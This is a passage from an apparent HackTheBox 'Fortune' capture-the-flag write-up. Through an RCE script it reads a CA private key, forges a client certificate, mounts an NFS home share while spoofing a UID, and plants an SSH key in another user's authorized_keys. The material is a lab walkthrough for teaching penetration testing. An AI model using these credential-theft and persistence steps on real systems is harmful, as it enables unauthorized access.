class="line">Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw</span><br><span class="line">HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL</span><br><span class="line">MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG</span><br><span class="line">b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1</span><br><span class="line">bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy</span><br><span class="line">DuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR</span><br><span class="line">QEsU99R6UDBj/rz1dMRq3P/<span class="number">7</span>VdbNC5o2zrd99fN/MDz288Rv7Z24LKWvPoEFWU5D</span><br><span class="line">SpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1oW/kbz9205JT1LvR+mqNWbH/<span class="number">0</span>Q92K</span><br><span class="line"><span class="number">7</span>Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC</span><br><span class="line">m/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs</span><br><span class="line">jgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/SybEGB3vBe4e+wvzkT7YD4lqubvXZ</span><br><span class="line">O346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ/<span class="number">1</span>B2PgRrzv/mmlgL7</span><br><span class="line">JOpJNWMUbc8bEf698QziuCXj5R/+Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX</span><br><span class="line">EjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v</span><br><span class="line">XK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T</span><br><span class="line">nb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS/hId</span><br><span class="line">Md8NPcYbC32/OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE+IcSQJs1UTIogSJ2i5W</span><br><span class="line">MBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEB</span><br><span class="line">CwUAA4ICAQAJ0/abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti</span><br><span class="line">zhZSFR8/JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx++ZQc1ljI7owLfDYfhQ08</span><br><span class="line"><span class="number">0</span>CJiXxmwO4XupL23cxu9i9464+knHvqvE1Uhj/L9HO5pVD5uAS2kePnSju7n08gg</span><br><span class="line">miqzREAc0qzehpoJXuS50wJc4otGgU5l+Rsen8giWdR0a1TxKm2UF/wFQbSU+WwY</span><br><span class="line"><span class="number">8</span>F5PquwOz384mmQ/<span class="number">3</span>k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I</span><br><span class="line"><span class="number">1</span>Y4UXIOE/nKK/UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i+<span class="number">3</span></span><br><span class="line">OpY+NpJ0mjem7/d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW/ENNG</span><br><span class="line">z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0/<span class="number">8</span>BCuEwNuMz9mHc9</span><br><span class="line">DFhdfx5zU8OYUVpw4UB8IC2wbybyW+ftkcsfLngYasH3cZa1GpXq/qDByCW2C8kg</span><br><span class="line">z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv</span><br><span class="line">HinFDCeM/GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA==</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"></span><br><span class="line">[?] command : cat /home/bob/ca/intermediate/private/intermediate.key.pem</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAuTGpzUbl4RIyDuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6N</span><br><span class="line">TzZAjOvCAJu7tiJjnvrUxf4SzuLRQEsU99R6UDBj/rz1dMRq3P/<span class="number">7</span>VdbNC5o2zrd9</span><br><span class="line"><span class="number">9</span>fN/MDz288Rv7Z24LKWvPoEFWU5DSpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1o</span><br><span class="line">W/kbz9205JT1LvR+mqNWbH/<span class="number">0</span>Q92K7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI9</span><br><span class="line"><span class="number">7</span>sB6jXxlgHzblwFlQaHvh6H7u6rCm/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL</span><br><span class="line"><span class="number">6</span>YmfIsPJdu4NoeEeXofqwQjNf2bsjgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/S</span><br><span class="line">ybEGB3vBe4e+wvzkT7YD4lqubvXZO346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVo</span><br><span class="line">KmimYUWi2fJ/<span class="number">1</span>B2PgRrzv/mmlgL7JOpJNWMUbc8bEf698QziuCXj5R/+Lover058</span><br><span class="line">nrvCAnI4I4wUHTGAgOC1J4hbVoYXEjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xp</span><br><span class="line">ANJIlxH0gwaTQ4a8HAPBliHnEV0vXK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb</span><br><span class="line"><span class="number">7</span>K4H1yh5VF9zkLCTN6WYoaSM1Z0Tnb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEA</span><br><span class="line">AQKCAgEAkjfD+W+g0LOtElN2TtYewtRAPVYc+<span class="number">9</span>ogRKq28PUtpEemGccLix8qmBkM</span><br><span class="line">c66B5qwAO+WPWUPhVbd/v2OIiqQYbnfGe7p1klwCg7sYlg2ilyaLX2tA6I/<span class="number">4</span>O/<span class="number">3</span>m</span><br><span class="line">fVD7joCYiafHVXJI5toEBz4znHdidokaQOODcE0A9ig1pIuKrX3Ktghl/TgR3W0P</span><br><span class="line">BesWKpyf2ThdZA0irvKcXaY3fpxBOxho5CV8WW8KpBld70Uu79v0OdGPVJJkMJGn</span><br><span class="line">EmuCdReE+u0AUfZy6xlHzhs5/DUEwkP3gwSCs0IICyDnEQPkfn3cOIKCdUFTg/<span class="number">9</span>R</span><br><span class="line">cbVCzi0P7VMi5oYsugppezeBjiX+EDQogYDpSF94aFy8FdG6UgGLUpicNyG93niL</span><br><span class="line">iXTJ0X0MS1E1AWSvECguIuUaNuDW+ZOdMCGoKKVCjTzHGvMunSP5ibIhSprhf4v0</span><br><span class="line">KrBxalXAZafq6jVrEkQkNQrVVaodkFMFH4+J3Sa8Zi1mOiQ9xFmGMV+<span class="number">8</span>AUiz899J</span><br><span class="line"><span class="number">4</span>PHcf7WzLb/FilyhwIM3HPSI7n3mJ0x7xkuQ3COxioVbvCkz0fAaQzz1U8h/pFxV</span><br><span class="line">+wfx2X5F3N8RzU5ufR/M/Asni8RId7M8TJ44qWQln8itM+<span class="number">0</span>aWTKiLrhBOcC55eug</span><br><span class="line">hHIop2z+amPqxsynTVbbmiVwGpCYGNt3Q/<span class="number">7</span>/FovcxF36hkbULwECggEBAPPgQwX4</span><br><span class="line">gL9PBBwSi2oCS+<span class="number">164</span>tSTc0B3R31B0AatewdXyASNYml9rCTOa/VJntvIAHDvWQ3+</span><br><span class="line">wfrf34/<span class="number">1</span>DIdZttwPYpcKAiWz/CXqPqEhd3uFLOrRoo1xBaenwLvCI99cYEvcrQIF</span><br><span class="line">ctBDsqGytJ/Begs7dg04KLZUbsoYVTzkwf9O0I1aEHY4r9cUfXyPBYFl1qJdJoY1</span><br><span class="line"><span class="number">83</span>sZAZo+DXLdmtXVpoM/<span class="number">8</span>MlhnMfg9VQ+txrMZg+<span class="number">1</span>zEiuiNY9Rmv6CDpx68WcNKxF</span><br><span class="line">y6mEkR8Ux3ZdHht/<span class="number">9</span>azTU9n2btsx3EPBviwgiXuPLdCwyjfopcUaj+<span class="number">2</span>cX9n5dO5E</span><br><span class="line">HFZXUnQKj5UgttcCggEBAMJmkplp9ofzkF17Z+B6u/PJHmFKBn/PgD1NKBlGINIY</span><br><span class="line">wh/<span class="number">3</span>mFq1AvqHqy9Y9q9H+S/rIr8i+ADi39lWUywYWbGxpTJ6q68tKJR2UVxP0otZ</span><br><span class="line">CRqtqV/BUhADeXrxnSdTEtA9CTgLEn+fHbDGwzW1nhB/EsEfQFQBx31juR2k5kR3</span><br><span class="line">LFpiex3zAvVYOuM9fkHsCp5rDsvv10/<span class="number">6</span>+aUzVOXwYzNfDBU9PpdK0AnTy0rijXM4</span><br><span class="line"><span class="number">4</span>Ky6/DFEMRCh1yC/O99u8AomyvlPJXyOFlrijUikBGpBUE60zB0dFw62NlBZg0BX</span><br><span class="line">po2sJnPZYgERFCb2jCK2SJnWWgtPvQbwHqXBLj4uxPUCggEBALEHSP/LjQHSRORv</span><br><span class="line"><span class="number">3</span>b29HwqrWn7+<span class="number">7</span>fmM3Fsja/N8+MKyyOHtE9QJwu0Q3rM2ltdpjlBsnhOXq44F9s4U</span><br><span class="line">Dt0tlZyWmnWTcU2XImEPchkbJxWF7b4jIMFVmspB7pkc61dXQhuve/Lsq5RcoA3a</span><br><span class="line">oF0bYBFJP3+HFZ6NGcMf+Lf0QpKmzqLdDvgSXCpfmFvToiZ1G2HPBokEHtNrqosh</span><br><span class="line">ojeQf7XbmjzKLGqyrdE2Dj/yKo6Mc0XSLRFRiMkjv7vfyxtJ2OEga+fl3loWfhW2</span><br><span class="line">yre0Dofd0iN7X/Hnfj8lKYQR3o8/qy0DGTnVK2V8PuEeT/<span class="number">4</span>mtjmPaH8Q+BUA3DyZ</span><br><span class="line"><span class="number">8</span>fJJxg8CggEAJ+AoZAWjRyHD1BkTJq2mTgxMCgLIMIFcubZQ6lZDNzVS5IHCI6EL</span><br><span class="line">ml4n1A94kl2+FIEz4GcI3g2rgwY9C0d3Zoac7yzQeJ9XupRGfhv1gRXjUzCaFIUw</span><br><span class="line">Ew7TZU+YP8+/hS1v7an/wmPeEDvFIQg/Av092JVTeaffxq2k9Bq2DQcw9t1Kicsm</span><br><span class="line">KTNO6PvdISKMzxAAuf5ZeRNvD97mpD/Z6ViuvtCQPTJgWBO0mIi+IQtisqusPWLS</span><br><span class="line">eano2dPAMUWtQTfR3K/KbbErjrr35hWWvkDley+EytgDucXQgEzMKm+QP3E3df36</span><br><span class="line">J2PccV2TQy+G1t9sGvPhP0IT10Y3+RNY3QKCAQBCgyEOu2PEHO4FHHJsyXSN9als</span><br><span class="line">OZa+sOykZ/<span class="number">7</span>fdjBZpAsjvcmxUfAxT07+EVUz4Wo186BKlthQjVLoLd2QfeTYmGhj</span><br><span class="line">IsZnjm0Ds8ezFka/<span class="number">3</span>Cu7YwGt6MBfUO6Vq2MLlUDgvtcWPTvBvipfmfZtJ0x2hhNv</span><br><span class="line">y6Lpg/KJrald3NHrIcS4GvE8gxz1AFmMM0j00EuJSZk66hpC2bBKMunXAquPDN3g</span><br><span class="line">XPwjyvXUcxDf8Jx1MGFfO++<span class="number">6</span>RlZMEO7jmB/xgonPkWP4xEcQlOQ65UfhpLjfum96</span><br><span class="line">Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>We can use them to generate a <code>PKCS12</code> certificate to access the <code>https</code> service. with <code>openssl</code> we can do it with a single command : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;cert# ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug  2 13:40 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..</span><br><span class="line">-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem</span><br><span class="line">-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12</span><br><span class="line">Enter Export Password:</span><br><span class="line">Verifying - Enter Export Password:</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;cert# ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug  2 13:43 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..</span><br><span class="line">-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12</span><br><span class="line">-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem</span><br><span class="line">-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;cert#</span><br></pre></td></tr></table></figure>
<p>Now we can import the certificate in Firefox :<br><img src="/images/hackthebox/fortune/7.png" alt=""><br><img src="/images/hackthebox/fortune/8.png" alt=""><br><img src="/images/hackthebox/fortune/9.png" alt=""><br>After removing the SSL exception it will ask for our certificate and give us access :<br><img src="/images/hackthebox/fortune/10.png" alt=""></p>
<h2 id="Elevated-Network-Access-NFS-User-Flag"><a href="#Elevated-Network-Access-NFS-User-Flag" class="headerlink" title="Elevated Network Access, NFS, User Flag"></a>Elevated Network Access, NFS, User Flag</h2><p>After getting access to <code>https</code> this message is what’s on the index page :<br><img src="/images/hackthebox/fortune/11.png" alt=""><br>I didn’t know what <code>authpf</code> was so I searched about it.</p>
<blockquote>
<p>authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user’s session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - <a href="https://www.freebsd.org/cgi/man.cgi?query=authpf&apropos=0&sektion=8&manpath=FreeBSD+8.1-RELEASE+and+Ports&format=html" target="_blank" rel="noopener">freeBSD manual</a></p>
</blockquote>
<p>So basically this can give access to some filtered services we weren’t allowed to access before, to use it we need a key and luckily we can generate one :<br><img src="/images/hackthebox/fortune/12.png" alt=""><br>We have 3 users on the box, I tried all of them and <code>nfsuser</code> worked :<br><img src="/images/hackthebox/fortune/13.png" alt=""><br>Now is the time for another <code>nmap</code> scan :<br><code>nmap -sV -sT -sC fortune.htb</code><br><img src="/images/hackthebox/fortune/14.png" alt=""><br>We have two new ports, 8081 which is running <code>http</code> and <code>2049</code> which is running <code>nfs</code>. The <code>http</code> service gives us this message :<br><img src="/images/hackthebox/fortune/15.png" alt=""><br>So probably we need to focus on <code>nfs</code>.</p>
<blockquote>
<p><strong>Network File System</strong> (<strong>NFS</strong>) is a <a href="https://en.wikipedia.org/wiki/Distributed_file_system" target="_blank" rel="noopener">distributed file system</a> protocol originally developed by <a href="https://en.wikipedia.org/wiki/Sun_Microsystems" target="_blank" rel="noopener">Sun Microsystems</a> in 1984, allowing a user on a client <a href="https://en.wikipedia.org/wiki/Computer" target="_blank" rel="noopener">computer</a> to access files over a <a href="https://en.wikipedia.org/wiki/Computer_network" target="_blank" rel="noopener">computer network</a> much like local storage is accessed.  -<a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank" rel="noopener">Wikipedia</a></p>
</blockquote>
<p>I used the <code>RCE</code> script to check <code>/etc/exports</code> and the only thing there was <code>/home</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[?] command : cat /etc/exports</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">/home</span><br></pre></td></tr></table></figure>
<p>By using <code>nfs-ls</code> (which is a part of the package <code>libnfs-utils</code>) we can successfully list the directories :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# nfs-ls nfs:&#x2F;&#x2F;fortune.htb&#x2F;home</span><br><span class="line">drwxr-xr-x  2  1002  1002          512 nfsuser</span><br><span class="line">drwxr-xr-x  5  1001  1001          512 bob</span><br><span class="line">drwxr-x---  3  1000  1000          512 charlie</span><br></pre></td></tr></table></figure>
<p>I created a directory, called it <code>mnt</code> and mounted the <code>nfs</code> share in it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# mkdir mnt &amp;&amp; mount -t nfs fortune.htb:&#x2F;home .&#x2F;mnt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# ls -la mnt</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 5 root root  512 Nov  3  2018 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..</span><br><span class="line">drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob</span><br><span class="line">drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie</span><br><span class="line">drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune#</span><br></pre></td></tr></table></figure>
<p>However I couldn’t access <code>charlie</code>‘s directory :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# cd mnt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt# cd charlie</span><br><span class="line">-bash: cd: charlie: Permission denied</span><br></pre></td></tr></table></figure>
<p>This is because I’m trying with <code>root</code> whose <code>uid</code> is <code>0</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt# id </span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt#</span><br></pre></td></tr></table></figure>
<p>And the way <code>nfs</code> permissions work I need to have the same <code>uid</code> as <code>charlie</code> which is <code>1000</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[?] command : id charlie</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">uid=<span class="number">1000</span>(charlie) gid=<span class="number">1000</span>(charlie) groups=<span class="number">1000</span>(charlie), <span class="number">0</span>(wheel)</span><br></pre></td></tr></table></figure>
<p>I already have a user on my box with the <code>uid</code> 1000 called <code>rick</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt# id rick</span><br><span class="line">uid&#x3D;1000(rick) gid&#x3D;1000(rick) groups&#x3D;1000(rick)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt#</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/fortune/16.png" alt=""><br>We owned user.</p>
<h2 id="Privilege-Escalation-Root-Flag"><a href="#Privilege-Escalation-Root-Flag" class="headerlink" title="Privilege Escalation, Root Flag"></a>Privilege Escalation, Root Flag</h2><p>First thing I wanted to do is to get <code>ssh</code>, luckily I had write access to <code>authorized_keys</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt&#x2F;charlie$ ls -la</span><br><span class="line">total 22</span><br><span class="line">drwxr-x--- 3 rick rick 512 Nov  6  2018 .</span><br><span class="line">drwxr-xr-x 5 root root 512 Nov  3  2018 ..</span><br><span class="line">-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc</span><br><span class="line">-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc</span><br><span class="line">-rw-r----- 1 rick rick 359 Oct 11  2018 .login</span><br><span class="line">-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc</span><br><span class="line">-rw------- 1 rick rick 608 Nov  3  2018 mbox</span><br><span class="line">-rw-r----- 1 rick rick 216 Oct 11  2018 .profile</span><br><span class="line">drwx------ 2 rick rick 512 Nov  2  2018 .ssh</span><br><span class="line">-r-------- 1 rick rick  33 Nov  3  2018 user.txt</span><br><span class="line">-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults</span><br><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt&#x2F;charlie$ cd .ssh</span><br><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt&#x2F;charlie&#x2F;.ssh$ ls -la</span><br><span class="line">total 4</span><br><span class="line">drwx------ 2 rick rick 512 Nov  2  2018 .</span><br><span class="line">drwxr-x--- 3 rick rick 512 Nov  6  2018 ..</span><br><span class="line">-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys</span><br><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt&#x2F;charlie&#x2F;.ssh$</span><br></pre></td></tr></table></figure>
<p>I used <code>ssh-keygen</code> to generate a private and a public key :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# mkdir ssh</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# ssh-keygen</span><br><span class="line">Generating public&#x2F;private rsa key pair.</span><br><span class="line">Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_rsa): &#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh&#x2F;id_rsa</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in &#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh&#x2F;id_rsa.</span><br><span class="line">Your public key has been saved in &#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh&#x2F;id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ&#x2F;Gt+Cs root@kali</span><br><span class="line">The key&#39;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|%B*  .           |</span><br><span class="line">|&#x3D;O..  o .        |</span><br><span class="line">|++. .. . .       |</span><br><span class="line">|B o.. . .        |</span><br><span class="line">|&#x3D;+...+ .S        |</span><br><span class="line">|+.o...o.         |</span><br><span class="line">|oo o  +..        |</span><br><span class="line">|+.o  E +.        |</span><br><span class="line">|%++.  ..         |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# cat ssh&#x2F;id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2&#x2F;8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A&#x2F;uQ1UNKufsUQ19sWuzspksvN&#x2F;PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg&#x2F;JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G&#x2F;GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune#</span><br></pre></td></tr></table></figure>
<p>Then I wrote my public key to <code>authorized_keys</code> and got <code>ssh</code> as <code>charlie</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt&#x2F;charlie&#x2F;.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2&#x2F;8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A&#x2F;uQ1UNKufsUQ19sWuzspksvN&#x2F;PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg&#x2F;JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G&#x2F;GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali&quot; &gt;&gt; authorized_keys </span><br><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;mnt&#x2F;charlie&#x2F;.ssh$ cd ..&#x2F;..&#x2F;..&#x2F;ssh&#x2F;</span><br><span class="line">rick@kali:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh$ su</span><br><span class="line">Password: </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh# ssh charlie@fortune.htb -i id_rsa</span><br><span class="line">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018</span><br><span class="line"></span><br><span 